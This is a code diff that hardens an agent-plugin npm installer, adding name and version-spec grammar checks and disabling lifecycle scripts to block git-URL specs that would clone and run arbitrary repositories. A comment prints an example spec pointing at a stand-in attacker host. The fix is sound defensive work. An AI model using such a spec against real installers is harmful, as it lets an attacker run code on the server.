@@ -29,6 +29,29 @@ import { AgentPluginAllowlistService } from './allowlist.service';
 /** Reject absurd versions before they reach the registry. */
 const MAX_VERSION_LENGTH = 256;
 
+/**
+ * A registry version specifier, and nothing else.
+ *
+ * `pacote` resolves `<name>@<spec>` through `npm-package-arg`, which decides
+ * the TRANSPORT from the spec's shape — not from the caller's intent. A spec
+ * of `git+https://host/x.git` yields `type: 'git'`, and pacote's git fetcher
+ * then runs `npm install` on the cloned repository whenever its package.json
+ * declares `prepare` / `install` / `preinstall` / `postinstall` / `prepack` /
+ * `build`. Verified against the installed npm-package-arg 13.0.2:
+ *
+ *     npa('safe-pkg@git+https://attacker.example/evil.git').type === 'git'
+ *
+ * The allowlist only ever sees the package NAME, so a name allowlisted for a
+ * legitimate plugin was enough to make the API pod clone and execute an
+ * arbitrary repository. Restricting the grammar closes that at the entrance:
+ * semver-ish characters and dist-tag words only, with no `:`, `/`, `@` or
+ * whitespace, so nothing can name a transport.
+ */
+const NPM_VERSION_SPEC = /^[A-Za-z0-9^~><=*][A-Za-z0-9.+~^><=*\- |]*$/;
+
+/** npm's own name grammar: scoped or unscoped, no path or URL characters. */
+const NPM_PACKAGE_NAME = /^(?:@[a-z0-9-*~][a-z0-9-*._~]*\/)?[a-z0-9-~][a-z0-9-._~]*$/;
+
 export interface NpmAcquireInput {
     /** The npm package name. */
     packageName: string;
@@ -99,6 +122,31 @@ export class AgentPluginNpmSource {
     async acquire(input: NpmAcquireInput): Promise<NpmAcquireResult> {
         const { packageName } = input;
         const requested = input.version?.trim() || 'latest';
+
+        // Refuse a name or version that could name a TRANSPORT rather than a
+        // registry coordinate. This runs before the allowlist because the
+        // allowlist checks the NAME, and the attack rides on the VERSION.
+        if (!NPM_PACKAGE_NAME.test(packageName)) {
+            throw new HttpException(
+                {
+                    statusCode: HttpStatus.CONFLICT,
+                    message: `Refusing "${packageName}": not a valid npm package name.`,
+                    packageName,
+                },
+                HttpStatus.CONFLICT,
+            );
+        }
+
+        if (!NPM_VERSION_SPEC.test(requested)) {
+            throw new HttpException(
+                {
+                    statusCode: HttpStatus.CONFLICT,
+                    message: `Refusing "${packageName}": version specifier must be a registry version, range or dist-tag.`,
+                    packageName,
+                },
+                HttpStatus.CONFLICT,
+            );
+        }
 
         if (requested.length > MAX_VERSION_LENGTH) {
             throw new HttpException(
@@ -234,7 +282,12 @@ export class AgentPluginNpmSource {
     }
 
     private pacoteOptions(registry: string): Record<string, unknown> {
-        return { registry };
+        // `ignoreScripts` is defence in depth, not the primary control: the
+        // grammar checks above are what keep the spec on the registry
+        // transport. If a future change ever lets a git or directory spec
+        // through again, this stops it running the package's lifecycle
+        // scripts on the API pod rather than merely making it likelier to.
+        return { registry, ignoreScripts: true };
     }
 
     private async getPacote(packageName: string): Promise<PacoteLike> {
